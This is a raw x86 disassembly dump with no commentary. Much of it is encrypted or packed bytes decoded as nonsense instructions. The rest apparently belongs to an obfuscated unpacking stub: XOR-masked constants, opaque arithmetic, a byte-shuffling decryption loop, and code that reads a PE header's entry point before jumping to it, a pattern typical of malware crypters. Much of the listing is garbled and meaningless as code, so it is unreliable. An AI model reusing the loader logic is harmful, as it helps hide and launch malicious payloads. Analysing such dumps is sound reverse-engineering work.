  4061af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b0:	sub    BYTE PTR [ebx-0x80],cl
  4061b3:	or     BYTE PTR [ecx-0x3f],dl
  4061b6:	daa    
  4061b7:	jo     0x406183
  4061b9:	lock dec eax
  4061bb:	pusha  
  4061bc:	inc    esp
  4061bd:	or     al,0x1b
  4061bf:	pop    es
  4061c0:	inc    ebx
  4061c1:	cmp    BYTE PTR [eax+0x737261b1],dl
  4061c7:	mov    ds:0x931ee697,al
  4061cc:	xchg   edx,eax
  4061cd:	adc    eax,0x386946de
  4061d2:	cs ins BYTE PTR es:[edi],dx
  4061d4:	std    
  4061d5:	mov    dh,0x84
  4061d7:	cmp    ecx,ecx
  4061d9:	jg     0x406166
  4061db:	enter  0xa877,0x21
  4061df:	icebp  
  4061e0:	mov    dh,0xed
  4061e2:	push   esp
  4061e3:	outs   dx,BYTE PTR ds:[esi]
  4061e4:	inc    edx
  4061e5:	vmwrite edi,DWORD PTR [edx]
  4061e8:	pop    eax
  4061e9:	push   es
  4061ea:	test   al,0x9e
  4061ec:	popf   
  4061ed:	pop    ecx
  4061ee:	test   DWORD PTR [eax-0x22dad25f],edx
  4061f4:	sub    dh,BYTE PTR [edx]
  4061f6:	sub    ebx,ebx
  4061f8:	and    al,0x29
  4061fa:	cmp    eax,0x4b973cc1
  4061ff:	sbb    eax,DWORD PTR [ebx]
  406201:	or     ah,BYTE PTR [edi+ecx*8-0x65e95154]
  406208:	mov    cl,0x96
  40620a:	jne    0x4061a9
  40620c:	mov    al,0x4b
  40620e:	jg     0x406199
  406210:	outs   dx,BYTE PTR ds:[esi]
  406211:	mov    dl,0xbe
  406213:	and    al,0x8b
  406215:	jle    0x4061cf
  406217:	(bad)  
  406218:	mov    ch,0x61
  40621a:	cld    
  40621b:	arpl   WORD PTR [ebp-0x7f],cx
  40621e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40621f:	cmp    BYTE PTR [esi+ebx*2],dh
  406222:	xchg   ebx,eax
  406223:	fisttp DWORD PTR [ebx-0xd1fd61]
  406229:	xor    al,0x1a
  40622b:	and    eax,0xcc28d48d
  406230:	in     al,dx
  406231:	fnstcw WORD PTR [edi-0x23]
  406234:	lds    ebp,FWORD PTR [edx-0x60]
  406237:	xor    ebx,DWORD PTR [ebx]
  406239:	jle    0x4062b9
  40623b:	jp     0x40627b
  40623d:	fs int 0xd5
  406240:	fdivr  st(1),st
  406242:	(bad)  
  406244:	js     0x40628a
  406246:	sub    al,0x57
  406248:	(bad)  
  406249:	fst    DWORD PTR [edi]
  40624b:	mov    edi,0x27c2ad0f
  406250:	mov    ebp,0x231ff9eb
  406255:	imul   eax,DWORD PTR [ebx],0xffffffaf
  406258:	cmp    ecx,ebx
  40625a:	xchg   esi,eax
  40625b:	repz jecxz 0x40629a
  40625e:	scas   eax,DWORD PTR es:[edi]
  40625f:	retf   
  406260:	int3   
  406261:	xor    ecx,DWORD PTR [edi+0x26]
  406264:	dec    esi
  406265:	mov    bh,0xb8
  406267:	mov    ds:0x4dfd9a55,al
  40626c:	arpl   WORD PTR [esi-0x39],bx
  40626f:	pop    ss
  406270:	inc    esp
  406271:	(bad)  
  406272:	adc    al,0xb3
  406274:	mov    eax,0xa449701b
  406279:	push   0xffffffe2
  40627b:	imul   ebx,DWORD PTR [eax+eax*2+0x72],0xffffffef
  406280:	push   ds
  406281:	jns    0x4062d9
  406283:	das    
  406284:	stos   DWORD PTR es:[edi],eax
  406285:	fst    DWORD PTR [edx-0x23]
  406288:	jae    0x40621a
  40628a:	enter  0xfea2,0x50
  40628e:	push   esi
  40628f:	pop    es
  406290:	(bad)  
  406291:	jae    0x4062df
  406293:	ja     0x4062c0
  406295:	fcomip st,st(2)
  406297:	dec    esp
  406298:	popf   
  406299:	mov    ch,0xb1
  40629b:	(bad)  
  40629c:	push   eax
  40629d:	shl    ebp,0xcc
  4062a0:	cmp    eax,0x53499666
  4062a5:	test   al,0x58
  4062a7:	xchg   esp,eax
  4062a8:	pop    es
  4062a9:	mov    al,ds:0xa7014785
  4062ae:	arpl   WORD PTR [eax+0x3],dx
  4062b1:	pop    es
  4062b2:	pop    es
  4062b3:	lahf   
  4062b4:	or     eax,esi
  4062b6:	jae    0x4062fa
  4062b8:	push   ebx
  4062b9:	xchg   DWORD PTR [edi+0x73b621a4],esi
  4062bf:	cmp    eax,0x161aa8de
  4062c4:	scas   al,BYTE PTR es:[edi]
  4062c5:	xor    eax,0xcde5696a
  4062ca:	or     cl,dl
  4062cc:	retf   
  4062cd:	inc    eax
  4062ce:	and    al,0x58
  4062d0:	ds and al,0xa
  4062d3:	adc    dh,BYTE PTR [esi+0x84c3ba4]
  4062d9:	(bad)  
  4062da:	cwde   
  4062db:	test   DWORD PTR [ebx+0x7a],0xe6b70210
  4062e2:	popf   
  4062e3:	mov    ebp,0x91f43a67
  4062e8:	nop
  4062e9:	test   eax,0x4f058e94
  4062ee:	mov    ss,WORD PTR [ecx-0x1]
  4062f1:	icebp  
  4062f2:	js     0x4062c5
  4062f4:	sar    BYTE PTR [ebx],cl
  4062f6:	pop    ebx
  4062f7:	add    bh,BYTE PTR [ecx+edx*8-0x2e]
  4062fb:	add    al,0x7d
  4062fd:	mov    WORD PTR [ebp+0x1d],ds
  406300:	inc    edi
  406301:	cmp    ch,al
  406303:	and    edi,ecx
  406305:	push   es
  406306:	jp     0x40630a
  406308:	inc    ebp
  406309:	(bad)  
  40630a:	mov    ebp,0x90ecd9de
  40630f:	fist   WORD PTR [ecx]
  406311:	out    0x36,al
  406313:	out    dx,eax
  406314:	adc    dl,BYTE PTR [ebx-0x3a708df1]
  40631a:	dec    eax
  40631b:	lds    ecx,FWORD PTR [esi+0x6e]
  40631e:	sahf   
  40631f:	add    eax,0xc65fa5a9
  406324:	cmp    ah,BYTE PTR [ebx-0x3c]
  406327:	adc    al,0x44
  406329:	mov    al,ds:0x91f58971
  40632e:	adc    al,cl
  406330:	mov    ah,0xf3
  406332:	xor    ch,BYTE PTR ds:0xf8bea90d
  406338:	adc    eax,0xa806c55
  40633d:	fmul   DWORD PTR [edx]
  40633f:	or     ebp,DWORD PTR [edi-0x469ad7a2]
  406345:	inc    ebx
  406346:	fimul  WORD PTR [ebx-0x73]
  406349:	lods   al,BYTE PTR ds:[esi]
  40634a:	cmc    
  40634b:	shl    eax,1
  40634d:	test   ebp,ebp
  40634f:	(bad)  
  406351:	(bad)  
  406352:	fisub  WORD PTR ds:0xd8bcc1c
  406358:	add    BYTE PTR [eax+ebp*1],bh
  40635b:	inc    edi
  40635c:	scas   al,BYTE PTR es:[edi]
  40635d:	imul   esp,eax,0x5a4fdeef
  406363:	pop    ss
  406364:	adc    cl,cl
  406366:	cmp    al,BYTE PTR [edx]
  406368:	or     DWORD PTR [ecx-0x2871bdcc],esi
  40636e:	arpl   WORD PTR [edi],sp
  406370:	pushf  
  406371:	mov    al,ds:0x1621ab9
  406376:	nop
  406377:	psrad  mm7,QWORD PTR [ebx+0x49]
  40637b:	mov    ds:0x456da7bb,eax
  406380:	arpl   di,bx
  406382:	out    0x17,eax
  406384:	add    ebp,DWORD PTR [edi-0x14]
  406387:	lahf   
  406388:	ret    
  406389:	out    dx,eax
  40638a:	mov    bh,0x5
  40638c:	jp     0x4063bf
  40638e:	fcmovnbe st,st(5)
  406390:	(bad)  ds:0x3d2e0761
  406396:	inc    ebp
  406397:	or     DWORD PTR [eax-0x65707919],ebp
  40639d:	adc    al,0x90
  40639f:	mov    esp,0xc3a15d72
  4063a4:	xor    BYTE PTR ds:0x2da0846d,cl
  4063aa:	clc    
  4063ab:	loopne 0x40634e
  4063ad:	imul   ebp,ebx,0x3242bdb7
  4063b3:	outs   dx,DWORD PTR ds:[esi]
  4063b4:	lahf   
  4063b5:	sub    ebp,DWORD PTR [edx+0x5efd27c5]
  4063bb:	cmp    al,0xb7
  4063bd:	dec    edi
  4063be:	pop    ebp
  4063bf:	xchg   esi,ecx
  4063c1:	aad    0x55
  4063c3:	out    0x11,eax
  4063c5:	cwde   
  4063c6:	call   0x89ed:0x2cbae06e
  4063cd:	mov    esi,0x3cca6369
  4063d2:	sub    BYTE PTR [edi],cl
  4063d4:	xchg   BYTE PTR [ebx],al
  4063d6:	add    BYTE PTR [eax],al
  4063d8:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4063de:	cld    
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	data16 scas al,BYTE PTR es:[di]
  406461:	lds    esp,FWORD PTR [ebp+0x337e7e38]
  406467:	jge    0x4064e7
  406469:	jle    0x4064a1
  40646b:	(bad)  
  40646c:	(bad)  
  40646d:	jp     0x40647a
  40646f:	mov    cl,0xbc
  406471:	or     BYTE PTR [esi],0x57
  406474:	jb     0x4064bd
  406476:	xchg   ecx,eax
  406477:	cld    
  406478:	push   DWORD PTR [edi-0x722b50f9]
  40647e:	div    BYTE PTR [ecx+0x62]
  406481:	ins    DWORD PTR es:[edi],dx
  406482:	pop    ecx
  406483:	dec    ebx
  406484:	hlt    
  406485:	out    0xb1,eax
  406487:	mov    edx,0xe739ad41
  40648c:	lds    esp,FWORD PTR [ebx]
  40648e:	fimul  WORD PTR ds:[esi-0x50]
  406492:	cmp    al,0x14
  406494:	push   ebx
  406495:	(bad)  
  406496:	xor    ch,BYTE PTR [edx]
  406498:	mov    eax,0x5da6c3db
  40649d:	cmp    al,0x82
  40649f:	lods   eax,DWORD PTR ds:[esi]
  4064a0:	(bad)  
  4064a2:	int3   
  4064a3:	xchg   BYTE PTR [edx+edx*8+0x78],dh
  4064a7:	(bad)  
  4064a8:	arpl   bx,bp
  4064aa:	in     eax,0xfd
  4064ac:	cs daa 
  4064ae:	out    0x5c,eax
  4064b0:	pop    ss
  4064b1:	or     edx,DWORD PTR [ecx+0x7ea22db7]
  4064b7:	mov    bh,0x2
  4064b9:	jmp    0x3055:0x3b4736ee
  4064c0:	dec    ecx
  4064c1:	mov    esp,0x1a5f3592
  4064c6:	fist   DWORD PTR [ecx+0x24]
  4064c9:	lea    ecx,[esi+edx*4]
  4064cc:	jle    0x4064d4
  4064ce:	add    DWORD PTR [edx+0x75],ecx
  4064d1:	mov    WORD PTR [ebx],gs
  4064d3:	push   edi
  4064d4:	imul   esp,DWORD PTR [ebp+0x2bf70be5],0x64
  4064db:	mov    eax,ds:0x3ae17ec7
  4064e0:	jnp    0x406466
  4064e2:	push   ebp
  4064e3:	jl     0x406564
  4064e5:	inc    ebp
  4064e6:	js     0x40648c
  4064e8:	gs test eax,0xc75cb925
  4064ee:	mov    ds:0xd44d993d,eax
  4064f3:	jl     0x406526
  4064f5:	dec    edx
  4064f6:	and    eax,0x81af0025
  4064fb:	retf   0xed56
  4064fe:	xor    DWORD PTR [eax+0x7b],edx
  406501:	cdq    
  406502:	mov    dh,0x2a
  406504:	aam    0xdf
  406506:	jae    0x40648a
  406508:	(bad)
  40650b:	cs jb  0x406568
  40650e:	int    0x43
  406510:	pop    eax
  406511:	add    bl,bh
  406513:	adc    edi,ecx
  406515:	das    
  406516:	das    
  406517:	add    DWORD PTR [ebp+eax*1+0x6b],ebx
  40651b:	and    dl,bh
  40651d:	fnstcw WORD PTR [edi+0x34]
  406520:	icebp  
  406521:	mov    esi,0x66873674
  406526:	addr16 sub al,0x8f
  406529:	jb     0x40655b
  40652b:	sub    edx,DWORD PTR [ebp+0x55d58952]
  406531:	call   0xed5b9522
  406536:	sub    al,0x96
  406538:	pop    esp
  406539:	push   0x15
  40653b:	mov    cs,WORD PTR [ecx]
  40653d:	aas    
  40653e:	cwde   
  40653f:	shr    dh,cl
  406541:	sub    eax,0x857cd8cf
  406546:	jmp    0x6264:0x61b6ebc7
  40654d:	pop    ebx
  40654e:	jg     0x40651d
  406550:	(bad)  
  406551:	xchg   edi,eax
  406552:	xor    BYTE PTR [esi+0x5],0xf6
  406556:	adc    BYTE PTR [ebp-0x29],0xac
  40655a:	cmp    DWORD PTR [esi-0x14],esi
  40655d:	inc    edx
  40655e:	pop    esi
  40655f:	cmp    eax,0x3e4fecfa
  406564:	scas   al,BYTE PTR es:[edi]
  406565:	sub    DWORD PTR [ebp+ebp*2+0xb],edi
  406569:	test   DWORD PTR [eax+0x7f203f3],ebx
  40656f:	xchg   ebx,edi
  406571:	add    DWORD PTR [edx],edi
  406573:	add    DWORD PTR [eax-0x50bf9975],esp
  406579:	mov    bl,0xd3
  40657b:	ja     0x4065e9
  40657d:	pop    ecx
  40657e:	mov    bh,0x32
  406580:	in     eax,dx
  406581:	into   
  406582:	mov    dl,0xb6
  406584:	daa    
  406585:	test   DWORD PTR [edi+0x182c7bdc],edi
  40658b:	fsubr  QWORD PTR [edi]
  40658d:	xchg   ebx,eax
  40658e:	outs   dx,DWORD PTR ds:[esi]
  40658f:	scas   al,BYTE PTR es:[edi]
  406590:	fadd   st,st(4)
  406592:	sar    DWORD PTR [edx-0x42],cl
  406595:	lahf   
  406596:	xchg   ebp,eax
  406597:	mov    dl,0x94
  406599:	dec    ecx
  40659a:	es jbe 0x4065c6
  40659d:	repnz icebp 
  40659f:	pop    eax
  4065a0:	and    al,0x32
  4065a2:	pop    es
  4065a3:	jecxz  0x406548
  4065a5:	inc    ebx
  4065a6:	pop    ecx
  4065a7:	(bad)  [ebx+ebx*1-0x2d]
  4065ab:	mov    bl,0xca
  4065ad:	push   cs
  4065ae:	je     0x4065a7
  4065b0:	push   0x53e3dd58
  4065b5:	add    BYTE PTR [edx],dl
  4065b7:	int3   
  4065b8:	mov    ecx,0x3ea72cf5
  4065bd:	cmp    al,0x4
  4065bf:	(bad)  
  4065c0:	retf   
  4065c1:	inc    esp
  4065c2:	xchg   ebx,eax
  4065c3:	dec    ecx
  4065c4:	in     eax,0x62
  4065c6:	ds mov dl,0xb0
  4065c9:	jp     0x406609
  4065cb:	test   bl,dh
  4065cd:	js     0x40656b
  4065cf:	or     ah,al
  4065d1:	jle    0x4065c0
  4065d3:	in     eax,dx
  4065d4:	jnp    0x4065b7
  4065d6:	jne    0x406644
  4065d8:	jg     0x4065e4
  4065da:	ficom  DWORD PTR [edx+ebp*8]
  4065dd:	fdiv   DWORD PTR [eax]
  4065df:	push   ebp
  4065e0:	push   cs
  4065e1:	cdq    
  4065e2:	push   esp
  4065e3:	xchg   ecx,eax
  4065e4:	retf   
  4065e5:	jbe    0x40656c
  4065e7:	jns    0x4065ce
  4065e9:	or     DWORD PTR [ebp+0x4f6943cf],eax
  4065ef:	mov    al,ds:0xfcc5e59b
  4065f4:	xchg   ecx,eax
  4065f5:	dec    eax
  4065f6:	xchg   ebp,eax
  4065f7:	sti    
  4065f8:	and    esi,esp
  4065fa:	cmp    DWORD PTR [esi+0x5359de68],ebp
  406600:	xor    BYTE PTR [ebx+0x62130c04],0x4
  406607:	fdivr  st(1),st
  406609:	bound  esi,QWORD PTR [esi+edx*1]
  40660c:	sbb    esi,DWORD PTR ss:[eax+0x52c95cdc]
  406613:	and    DWORD PTR [edx],eax
  406615:	gs sahf 
  406617:	mov    al,ds:0x8c2ff7ca
  40661c:	ja     0x4065b9
  40661e:	add    DWORD PTR [ebx],ecx
  406620:	push   0x0
  406622:	es dec esi
  406624:	dec    ebp
  406625:	cli    
  406626:	imul   edi,DWORD PTR [eax],0xffffff85
  406629:	(bad)  
  40662a:	scas   al,BYTE PTR es:[edi]
  40662b:	push   esp
  40662c:	mov    ecx,0xe4f2bde5
  406631:	out    dx,al
  406632:	mov    WORD PTR [edx+0x4231baaf],cs
  406638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406639:	xor    ch,BYTE PTR [eax+0x59]
  40663c:	jle    0x406609
  40663e:	inc    esi
  40663f:	hlt    
  406640:	aam    0x12
  406642:	iret   
  406643:	and    al,BYTE PTR [ebp-0x6a]
  406646:	jno    0x40666d
  406648:	jle    0x4066c7
  40664a:	inc    ebp
  40664b:	jge    0x40667e
  40664d:	pop    ds
  40664e:	jno    0x406605
  406650:	daa    
  406651:	xchg   ecx,eax
  406652:	pop    es
  406653:	jmp    0xa0a98561
  406658:	xor    edi,DWORD PTR [ebp+0x73]
  40665b:	push   ebp
  40665c:	fdivr  DWORD PTR [eax]
  40665e:	dec    eax
  40665f:	mov    ah,0x48
  406661:	cmp    al,0xab
  406663:	mov    ch,0x30
  406665:	lods   eax,DWORD PTR ds:[esi]
  406666:	clc    
  406667:	and    DWORD PTR [edx],esi
  406669:	repz clc 
  40666b:	retf   0x5882
  40666e:	outs   dx,DWORD PTR ds:[esi]
  40666f:	sbb    ebp,DWORD PTR [edx-0x61754725]
  406675:	inc    ebx
  406676:	jmp    0x4274fcf2
  40667b:	cli    
  40667c:	jo     0x4065ff
  40667e:	pop    es
  40667f:	jmp    0x4066dd
  406681:	bound  ebx,QWORD PTR [ebx+0x69697fba]
  406687:	dec    edx
  406688:	mov    ah,0x7f
  40668a:	test   al,0x23
  40668c:	cmp    ebx,edx
  40668e:	adc    DWORD PTR [ebx],0x3374869
  406694:	pushf  
  406695:	push   ecx
  406696:	jmp    0x4066c0
  406698:	bound  ebp,QWORD PTR [eax+0x62]
  40669b:	push   edx
  40669c:	nop
  40669d:	pop    ecx
  40669e:	sub    eax,0xc69dad5e
  4066a3:	jne    0x406649
  4066a5:	call   0x72316d47
  4066aa:	out    0xe5,al
  4066ac:	clc    
  4066ad:	xor    BYTE PTR [ebx],dl
  4066af:	cmp    eax,0x548d62d5
  4066b4:	icebp  
  4066b5:	cmp    dl,BYTE PTR [edi]
  4066b7:	xor    ebp,edi
  4066b9:	ror    BYTE PTR [esi],0xd0
  4066bc:	inc    esi
  4066bd:	jp     0x4066ed
  4066bf:	xor    BYTE PTR [ecx],dh
  4066c1:	int3   
  4066c2:	sub    DWORD PTR [ecx+0x11],edx
  4066c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c6:	lods   al,BYTE PTR ds:[esi]
  4066c7:	ss cdq 
  4066c9:	dec    edi
  4066ca:	pop    ebx
  4066cb:	test   DWORD PTR [ebp+0x7e],esp
  4066ce:	fcom   QWORD PTR [ebx+0x4]
  4066d1:	rol    BYTE PTR [esi+0x2eedfd9],1
  4066d7:	sbb    BYTE PTR [ecx-0xe],0x2
  4066db:	inc    ebp
  4066dc:	dec    edi
  4066dd:	mov    esi,0x8e738f79
  4066e2:	into   
  4066e3:	(bad)  
  4066e4:	cmp    al,0xb
  4066e6:	out    dx,al
  4066e7:	or     bh,dl
  4066e9:	fistp  WORD PTR [eax-0x27dfc23f]
  4066ef:	xor    ch,BYTE PTR [edi+0x76d338a8]
  4066f5:	sti    
  4066f6:	mov    eax,0xa82eb846
  4066fb:	mov    esp,0xf2b7bd23
  406700:	popf   
  406701:	js     0x40677f
  406703:	mov    esi,0xa7100da3
  406708:	repnz sar ah,cl
  40670b:	popf   
  40670c:	cmp    BYTE PTR [eax*4+0x712e81e6],bl
  406713:	sub    DWORD PTR [eax+0x218a650],eax
  406719:	lods   al,BYTE PTR ds:[esi]
  40671a:	jmp    0x4066b0
  40671c:	mov    ebp,0x8bc6fc3e
  406721:	or     BYTE PTR [edi-0x3d],dh
  406724:	mov    dl,0x75
  406726:	dec    esi
  406727:	scas   al,BYTE PTR es:[edi]
  406728:	add    BYTE PTR [eax],bl
  40672a:	add    DWORD PTR [ecx+0x745d8da],ebx
  406730:	jle    0x40679a
  406732:	jmp    0x4066d0
  406734:	cs pushf 
  406736:	cmc    
  406737:	inc    ecx
  406738:	stc    
  406739:	(bad)  
  40673a:	enter  0xc2c3,0x4b
  40673e:	inc    eax
  40673f:	shr    dl,cl
  406741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406742:	pusha  
  406743:	sbb    eax,0xe57661b9
  406748:	int3   
  406749:	hlt    
  40674a:	das    
  40674b:	push   0x5f
  40674d:	and    al,0x72
  40674f:	iret   
  406750:	jno    0x40673c
  406752:	cmp    bp,sp
  406755:	sar    cl,0x7
  406758:	push   es
  406759:	pop    edx
  40675a:	out    0xe4,al
  40675c:	ins    DWORD PTR es:[edi],dx
  40675d:	in     eax,dx
  40675e:	int    0xb
  406760:	stc    
  406761:	jne    0x406797
  406763:	out    0x44,al
  406765:	loope  0x406760
  406767:	xchg   edx,eax
  406768:	nop
  406769:	shl    BYTE PTR es:[edi],cl
  40676c:	jle    0x40677a
  40676e:	outs   dx,BYTE PTR ds:[esi]
  40676f:	sub    DWORD PTR [esi-0x1d],0xffffffdd
  406773:	sub    bl,BYTE PTR [esi-0x1a]
  406776:	lods   al,BYTE PTR ds:[esi]
  406777:	and    edi,DWORD PTR [eax+0x4ec6d777]
  40677d:	mov    dl,0x4f
  40677f:	or     al,0xbc
  406781:	jb     0x40676d
  406783:	(bad)  
  406784:	cmp    eax,0xc7079685
  406789:	add    esp,ebp
  40678b:	adc    ecx,DWORD PTR [ebx+0xa]
  40678e:	sbb    al,0x7
  406790:	sub    BYTE PTR [edx-0x17],cl
  406793:	jo     0x406717
  406795:	and    eax,esp
  406797:	int3   
  406798:	(bad)  
  40679a:	jnp    0x40672f
  40679c:	mov    es,esi
  40679e:	loop   0x4067ea
  4067a0:	jne    0x40675f
  4067a2:	scas   al,BYTE PTR es:[edi]
  4067a3:	nop
  4067a4:	mul    BYTE PTR [ebp+0x3f833b9]
  4067aa:	jge    0x406798
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x529b6e39],ecx
  4069de:	and    eax,0xc7667045
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	inc    ecx
  4069ea:	fs retf 0x8422
  4069ee:	stos   BYTE PTR es:[edi],al
  4069ef:	out    dx,eax
  4069f0:	into   
  4069f1:	xlat   BYTE PTR ds:[ebx]
